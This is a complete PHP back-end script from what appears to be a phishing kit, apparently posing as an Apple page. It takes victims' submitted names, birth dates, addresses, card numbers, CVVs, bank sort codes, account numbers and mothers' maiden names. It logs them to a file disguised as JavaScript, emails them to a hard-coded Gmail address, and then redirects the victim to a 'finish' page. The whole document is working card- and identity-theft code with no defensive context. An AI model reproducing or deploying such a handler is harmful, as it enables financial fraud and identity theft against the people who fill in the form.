<?php
session_start();

$ip = getenv("REMOTE_ADDR");
$domain = GetHostByName($REMOTE_ADDR);

$message .= "Name: ".$_POST['first_name']."\n";
$message .= "Date of Birth: ".$_POST['month']." - ".$_POST['day']." - ".$_POST['year']." \n";
$message .= "Address: ".$_POST['address']."\n";
$message .= "City: ".$_POST['city']."\n";
$message .= "Postal Code: ".$_POST['zip']."\n";
$message .= "Phone: ".$_POST['phone']."\n";
$message .= "---------------------------\n";
$message .= "Card Type: ".$_POST['cct']."\n";
$message .= "Card Number: ".$_POST['ccnumber']."\n";
$message .= "Expiration Date: ".$_POST['expdate_month']."/";
$message .= "".$_POST['expdate_year']."\n";
$message .= "CVV: ".$_POST['cvv2']."\n";
$message .= "SORT Code: ".$_POST['sort1']." - ".$_POST['sort2']." - ".$_POST['sort3']." \n";
$message .= "Account: ".$_POST['account']."\n";
$message .= "MMN: ".$_POST['mmn']."\n";
$message .= "IP: ".$ip." - ".$domain."\n";
$message .= "_____________________________\n";

$pula = fopen ("ccc.js" , "a");
fwrite ($pula , $message);
fclose ($pula);

$mailsubj="APPL - $ip";
$emailusr = "danne.danne001@gmail.com";
mail($emailusr, $mailsubj, $message);


header("Location: finish.html");
?>
